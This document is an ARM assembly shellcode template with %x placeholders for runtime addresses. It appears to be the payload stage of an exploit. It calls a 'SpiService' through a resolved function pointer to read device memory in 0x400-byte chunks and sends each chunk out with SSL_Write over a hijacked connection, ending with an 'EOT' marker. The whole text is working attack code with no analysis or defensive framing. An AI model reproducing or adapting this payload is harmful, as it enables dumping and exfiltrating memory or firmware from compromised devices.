start:	
	PUSH	{R5,R6,LR}

	SUB	SP, SP, #4

loop:	
	LDR	R3, wbuff
	LDR	R0, off
	ADD	R3, R3, R0
	LDR	R0, addr
	STR	R0, [R3]
	MOV	R1, #0x400
	STR	R1, [R3, #4]
	LDR	R2, chip
	STRB	R2, [R3, #9]

	ADD	R3, R3, #8
	MOV	R2, #1
	STRB	R2, [R3, #3]
	MOV	R2, #0xB
	STRB	R2, [R3, #2]
	SUB	R3, R3, #8

	MOV	R1, #0xEE
	STRB	R1, [R3, #0x110]
	STRB	R0, [R3, #0x111]

	MOV	R6, R3

	LDR	R5, VComClientSync_Call
	MOV	R1, R6
	LDR	R2, insz
	LDR 	R3, wbuff
	LDR	R0, off
	STR	R0, [SP]
	ADR	R0, svc_name
	BLX	R5
	
	LDR	R3, SSL_Write
	LDR	R2, wsize
	LDR	R1, wbuff
	MOV	R0, R7
	BLX	R3

	LDR	R0, addr
	ADD	R0, #0x400
	ADR	R1, addr
	STR 	R0, [R1]
	
	LDR	R0, memcount
	SUB	R0, #0x400
	ADR 	R1, memcount
	STR	R0, [R1]

	CMP	R0, #0
	BNE	loop
theend:
	LDR	R0, wbuff
	LDR	R1, eot
	STR	R1, [R0]

	LDR     R3, SSL_Write
	MOV     R2, #0x4
	LDR     R1, wbuff
	MOV     R0, R7
	BLX 	R3
	
	ADD	SP, SP, #4
	
	MOV	R0, -257
	POP	{R5,R6,LR}
	BX	LR

wbuff: 		.word 0x%x
SSL_Write: 	.word 0x%x

wsize: 		.word 0x818
off:		.word 0x408
insz:		.word 0x114
addr:		.word 0x%x
memcount:	.word 0x%x
chip:		.word 0x%x
VComClientSync_Call:	.word 0x%x
svc_name:	.string "SpiService"
.align
eot:	.string "EOT"
.align
final: .word 0x41414141
